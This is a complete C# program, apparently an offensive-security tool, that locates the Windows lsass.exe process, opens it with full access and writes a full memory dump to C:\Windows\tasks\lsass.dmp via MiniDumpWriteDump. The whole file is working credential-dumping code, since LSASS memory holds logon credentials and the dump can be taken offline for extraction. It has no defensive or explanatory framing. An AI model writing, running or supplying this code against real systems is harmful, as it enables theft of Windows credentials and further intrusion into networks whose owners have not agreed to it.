using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace MiniDump
{
    public class Program
    {
        static int MiniDumpWithFullMemory = 2;
        static UInt32 PROCESS_ALL_ACCESS = 0x001F0FFF;

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        public static void Main(string[] args)
        {
            // Get the PID of lsass.exe
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            Console.WriteLine($"Got lsass.exe PID: {lsass_pid}.");

            // Get a handle on LSASS
            IntPtr handle = OpenProcess(PROCESS_ALL_ACCESS, false, lsass_pid);
            Console.WriteLine($"Got a handle on lsass.exe: {handle}.");

            // Dump LSASS process to file
            string filePath = "C:\\Windows\\tasks\\lsass.dmp";
            FileStream dumpFile = new FileStream(filePath, FileMode.Create);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (dumped)
            {
                Console.WriteLine($"Dumped LSASS memory to {filePath}.");
            }
            else
            {
                Console.WriteLine($"Error dumping LSASS memory: {Marshal.GetLastWin32Error()}");
            }
        }
    }
}